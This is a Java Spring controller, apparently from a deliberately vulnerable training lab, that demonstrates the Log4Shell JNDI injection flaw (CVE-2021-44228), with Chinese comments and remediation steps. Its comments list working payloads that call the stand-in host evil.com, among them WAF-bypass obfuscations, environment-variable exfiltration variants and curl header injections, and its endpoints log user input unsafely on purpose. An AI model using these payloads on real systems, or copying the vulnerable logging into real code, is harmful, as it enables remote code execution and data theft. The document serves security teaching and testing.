package com.vulnlab.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;

/**
 * Log4Shell (Log4j2) 远程代码执行漏洞演示
 *
 * 漏洞说明：
 * - Log4j2 2.0-beta9 到 2.14.1 版本存在JNDI注入漏洞
 * - 攻击者可通过JNDI LDAP/RMI协议远程加载恶意类并执行
 * - CVE-2021-44228
 *
 * 漏洞原理：
 * 1. Log4j支持${}占位符功能
 * 2. 支持JNDI协议：${jndi:ldap://evil.com/exp}
 * 3. 支持环境变量：${env:USER}
 * 4. 支持系统属性：${sys:java.version}
 * 5. 支持上下文查找：${ctx:loginId}
 * 6. 支持 lower/upper 转换：${lower:${jndi:...}}
 * 7. 支持嵌套：${${lower:X}X}
 *
 * 绕过WAF的payload变种：
 * - ${jndi:ldap://evil.com/exp}
 * - ${jndi:rmi://evil.com/exp}
 * - ${jndi:ldap://${env:USER}.evil.com/exp}
 * - ${jndi:ldap://${hostName}.evil.com/exp}
 * - ${${lower:jndi}:ldap://evil.com/exp}
 * - ${${upper:jndi}:ldap://evil.com/exp}
 * - ${${::-j}ndi:ldap://evil.com/exp}
 *
 * 修复方案：
 * 1. 升级到 Log4j 2.17.1 或更高版本
 * 2. 设置环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS=true
 * 3. 删除JndiLookup类：zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
 *
 * @author VulnLab
 */
@RestController
@RequestMapping("/log4j")
public class Log4jController {

    // 使用漏洞版本的Log4j (2.14.1)
    private static final Logger logger = LogManager.getLogger(Log4jController.class);

    /**
     * Log4Shell漏洞 - 基础测试
     *
     * 测试环境搭建：
     * 1. 使用JNDIExploit工具: java -jar JNDIExploit.jar -i 0.0.0.0 -p 8888
     * 2. 或使用marshalsec: python -m http.server 80 && python malicious_ldap.py
     *
     * 测试用例：
     * - DNS探测: http://localhost:8080/log4j/vuln?token=${jndi:ldap://xxx.dnslog.cn/exp}
     * - RCE: http://localhost:8080/log4j/vuln?token=${jndi:ldap://evil.com:1389/Exploit}
     * - 环境变量: http://localhost:8080/log4j/vuln?token=${env:USER}
     * - 系统属性: http://localhost:8080/log4j/vuln?token=${sys:java.version}
     *
     * @param token 用户输入
     * @return 处理结果
     */
    @GetMapping("/vuln")
    public String log4jVuln(@RequestParam("token") String token) {
        // 漏洞代码：直接记录用户输入，触发JNDI注入
        logger.error("User token: {}", token);

        return "Token logged: " + token;
    }

    /**
     * Log4Shell漏洞 - 用户登录场景
     *
     * 测试用例：
     * - http://localhost:8080/log4j/login?username=${jndi:ldap://evil.com/exp}&password=123456
     *
     * @param username 用户名
     * @param password 密码
     * @return 登录结果
     */
    @PostMapping("/login")
    public String login(@RequestParam("username") String username,
                        @RequestParam("password") String password) {
        // 漏洞代码：记录登录请求，包含用户名
        logger.info("Login attempt - Username: {}, Password: {}", username, "******");

        // 模拟登录失败
        logger.error("Login failed for user: {}", username);

        return "Login failed for: " + username;
    }

    /**
     * Log4Shell漏洞 - HTTP Header场景
     *
     * 测试用例：
     * - curl -H "User-Agent: ${jndi:ldap://evil.com/exp}" http://localhost:8080/log4j/header
     * - curl -H "X-Api-Version: ${jndi:ldap://evil.com/exp}" http://localhost:8080/log4j/header
     * - curl -H "Referer: ${jndi:ldap://evil.com/exp}" http://localhost:8080/log4j/header
     *
     * @param userAgent User-Agent头
     * @param referer Referer头
     * @param apiVersion 自定义API版本头
     * @return 处理结果
     */
    @GetMapping("/header")
    public String logHeader(@RequestHeader(value = "User-Agent", defaultValue = "") String userAgent,
                            @RequestHeader(value = "Referer", defaultValue = "") String referer,
                            @RequestHeader(value = "X-Api-Version", defaultValue = "") String apiVersion) {
        // 漏洞代码：记录HTTP Header
        logger.info("Request from User-Agent: {}", userAgent);
        logger.info("Referer: {}", referer);
        logger.info("API Version: {}", apiVersion);

        return "Headers logged";
    }

    /**
     * Log4Shell漏洞 - 搜索/查询场景
     *
     * 测试用例：
     * - http://localhost:8080/log4j/search?q=${jndi:ldap://evil.com/exp}
     *
     * @param q 搜索关键词
     * @return 搜索结果
     */
    @GetMapping("/search")
    public String search(@RequestParam(value = "q", defaultValue = "") String q) {
        // 漏洞代码：记录搜索查询
        logger.info("Search query: {}", q);
        logger.warn("User searched for: {}", q);

        return "No results for: " + q;
    }

    /**
     * Log4Shell漏洞 - WAF绕过测试
     *
     * 绕过技巧测试：
     * - ${${lower:j}ndi:ldap://evil.com/exp}
     * - ${${upper:j}ndi:ldap://evil.com/exp}
     * - ${${::-j}ndi:ldap://evil.com/exp}
     * - ${jndi:ldap://${env:USER}.evil.com/exp}
     *
     * @param payload 绕过payload
     * @return 处理结果
     */
    @GetMapping("/bypass")
    public String bypassWaf(@RequestParam("payload") String payload) {
        logger.error("Bypass attempt: {}", payload);
        return "Payload logged: " + payload;
    }

    /**
     * 安全检查 - 显示系统信息（用于验证是否触发JNDI查询）
     *
     * @return 系统信息
     */
    @GetMapping("/info")
    public String info() {
        return String.format(
            "Log4j Version: 2.14.1 (Vulnerable)%n" +
            "Java Version: %s%n" +
            "OS: %s %s%n" +
            "This is a vulnerable environment for testing Log4Shell (CVE-2021-44228)",
            System.getProperty("java.version"),
            System.getProperty("os.name"),
            System.getProperty("os.version")
        );
    }
}
